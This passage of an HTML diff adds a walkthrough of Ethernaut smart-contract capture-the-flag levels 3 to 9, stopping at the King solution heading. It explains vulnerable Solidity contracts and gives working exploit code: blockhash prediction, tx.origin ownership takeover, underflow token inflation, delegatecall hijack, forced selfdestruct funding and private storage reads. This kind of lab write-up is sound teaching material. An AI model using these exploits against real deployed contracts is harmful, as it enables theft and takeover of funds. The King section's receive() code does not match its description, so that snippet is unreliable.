+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">FACTOR</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">side</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And by calling the Exploit() method 10 times in a row you’ll have the full solution for your instance.</p>
+<p>We can check the consecutiveWins variable equal or bigger than 10 by calling:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">consecutiveWins</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-4-telephone">
+  LEVEL 4: Telephone
+  <a href="#level-4-telephone" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-3">
+  Objective:
+  <a href="#objective-3" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Claim the ownership of the contract.</li>
+</ul>
+<h3 id="demystifying-contract-3">
+  Demystifying Contract:
+  <a href="#demystifying-contract-3" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a constructor and a function, The first line defines the owner address variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span></code></pre></div><p>The constructor initialize the owner&rsquo;s address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The changeOwner() function changes the owner state variable to the method variable if the wallet address isn&rsquo;t equal to the caller address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_owner</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_owner</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-3">
+  Demystifying Solution:
+  <a href="#demystifying-solution-3" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The <code>tx.origin</code> is the wallet address that deployed the instance while the <code>msg.sender</code> is the caller address either a wallet or a contract.</p>
+<p>The solution contract sets an interface for the Telephone&rsquo;s contract changeOwner() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ITelephone</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#a6e22e">address</span>) <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method changes the owner address to the wallet address <code>tx.origin</code> from the solution contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">changeOwner</span>(<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Due to the <code>tx.origin</code> being the wallet address while the <code>msg.sender</code> being the caller address which is the contract.</p>
+<p>You can check the owner state variable equal to your address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-5-token">
+  LEVEL 5: Token
+  <a href="#level-5-token" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-4">
+  Objective:
+  <a href="#objective-4" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>You are given 20 tokens, Get your hands on any additional tokens, Preferably a very large amount of tokens.</li>
+</ul>
+<h3 id="demystifying-contract-4">
+  Demystifying Contract:
+  <a href="#demystifying-contract-4" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on different functions and methods, The first two lines are defining a map and a variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">balances</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">totalSupply</span>;
+</span></span></code></pre></div><p>The first line is a map defined as &ldquo;balances&rdquo; that assigns every address to it&rsquo;s balance, and the second line is the totalSupply state variable.</p>
+<p>The constructor initialize your address balance and the totalSupply state variable to the _initialSupply parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_initialSupply</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">totalSupply</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_initialSupply</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The transfer() method allows address&rsquo;s to transfer value to each other:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_value</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">-</span> <span style="color:#a6e22e">_value</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">-=</span> <span style="color:#a6e22e">_value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">_value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With the security requirement of bigger than or equal to 0 balance subtracted from value for the sender address.</p>
+<p>The balanceOf() method allows address&rsquo;s to check any balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_owner</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">balance</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_owner</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-4">
+  Demystifying Solution:
+  <a href="#demystifying-solution-4" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Due to the wrong implementation of the transfer() method due to the balance and the value being unsigned integers and due to the lack of underflow protection we can directly inflate the amount of tokens in the balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#e6db74">&#34;Address&#34;</span>, <span style="color:#ae81ff">21</span>)
+</span></span></code></pre></div><p>By subtracting 21 from the initial balance and due to the lack of underflow protection the address balance will inflate.</p>
+<p>You can check the balance inflated:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#e6db74">&#34;Your address&#34;</span>)
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-6-delegation">
+  LEVEL 6: Delegation
+  <a href="#level-6-delegation" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-5">
+  Objective:
+  <a href="#objective-5" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Claim the ownership of the instance.</li>
+</ul>
+<h3 id="demystifying-contracts">
+  Demystifying Contracts:
+  <a href="#demystifying-contracts" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="delegate-contract">
+  Delegate Contract:
+  <a href="#delegate-contract" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on a constructor and a function, The first line defines the owner&rsquo;s address state variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span></code></pre></div><p>The constructor initialize the owner&rsquo;s address to the _owner parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_owner</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_owner</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The pwn() function changes the owner state variable to the wallet address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="delegation-contract">
+  Delegation Contract:
+  <a href="#delegation-contract" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on a constructor and a function, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Delegate</span> <span style="color:#a6e22e">delegate</span>;
+</span></span></code></pre></div><p>The first line is the owner&rsquo;s address state variable, The second line is the instance for the Delegate contract.</p>
+<p>The constructor initialize the instance address for the Delegate contract and the owner&rsquo;s address state variable to the wallet address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_delegateAddress</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">delegate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Delegate</span>(<span style="color:#a6e22e">_delegateAddress</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The fallback() method is a fallback function that delegate call the Delegate contract instance with data parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">fallback</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">result</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">delegate</span>).<span style="color:#a6e22e">delegatecall</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-5">
+  Demystifying Solution:
+  <a href="#demystifying-solution-5" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The fallback() method allows to Delegate call the pwn() method of the Delegate contract instance.</p>
+<p>By encoding the pwn() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pwn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeFunctionSignature</span>(<span style="color:#e6db74">&#39;pwn()&#39;</span>)
+</span></span></code></pre></div><p>And by making a transfer to the contract with the pwn() method encode in the data field, Your address will call the fallback function which will Delegate call the pwn() method and sets your address as the owner of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pwn</span>})
+</span></span></code></pre></div><p>You can check the owner state variable equal to your address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">owner</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-7-force">
+  LEVEL 7: Force
+  <a href="#level-7-force" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-6">
+  Objective:
+  <a href="#objective-6" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Make the balance of the contract greater than zero.</li>
+</ul>
+<h3 id="demystifying-contract-5">
+  Demystifying Contract:
+  <a href="#demystifying-contract-5" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is an empty contract and constructed based on nothing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Force</span> {<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                   MEOW ?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         /\_/\   /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ____/ o o \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  /~____  =ø= /
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (______)__m_m)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-6">
+  Demystifying Solution:
+  <a href="#demystifying-solution-6" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract doesn&rsquo;t maintain a payable fallback function and therefore we can&rsquo;t transfer into the contract balance.</p>
+<p>However we can force transfer into the contract balance through other contract via selfdestruct() function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">ForceExploit</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span> () <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">instanceAddress</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The selfdestruct() method destruct the ForceExploit contract and send the contract balance to the instance address.</p>
+<p>You can check the instance balance bigger than 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">instance</span>)
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-8-vault">
+  LEVEL 8: Vault
+  <a href="#level-8-vault" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-7">
+  Objective:
+  <a href="#objective-7" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Unlock the vault.</li>
+</ul>
+<h3 id="demystifying-contract-6">
+  Demystifying Contract:
+  <a href="#demystifying-contract-6" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a constructor and a function, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">locked</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bytes32</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">password</span>;
+</span></span></code></pre></div><p>The first line is the boolean locked state variable, The second line is the password variable.</p>
+<p>The constructor initialize the password variable and the boolean locked state variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_password</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_password</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The unlock() method changes the boolean locked state variable to false if the _password parameter is equal to the password variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_password</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">password</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">_password</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-7">
+  Demystifying Solution:
+  <a href="#demystifying-solution-7" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The password private state means other contracts can&rsquo;t read the password variable, However the password is publicly availabe in the blockchain as the contract slot.</p>
+<p>We can read the password by reading it&rsquo;s slot which is slot 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pwd</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">instance</span>, <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>And we can unlock the contract by using the password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">pwd</span>)
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-9-king">
+  LEVEL 9: King
+  <a href="#level-9-king" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-8">
+  Objective:
+  <a href="#objective-8" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Claim the kingship of the contract without getting overthrown.</li>
+</ul>
+<h3 id="demystifying-contract-7">
+  Demystifying Contract:
+  <a href="#demystifying-contract-7" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a constructor and a function, The first three lines are defining three variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#a6e22e">king</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">prize</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span></code></pre></div><p>The first line is the king address state variable, The second line is the prize variable and the third line is the owner&rsquo;s address state variable.</p>
+<p>The constructor initialize the owner variable and the king variable to the wallet address and the prize variable to the value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>() <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;  
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">king</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">prize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The receive() method is a fallback method that transfer the value back to the king and sets a new king:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The receive method sets your address as the king if the value is more than the prize and allows you to hike the prize value while claiming the kingship.</p>
+<p>The _king() method returns the current king address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_king</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">address</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">king</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-8">
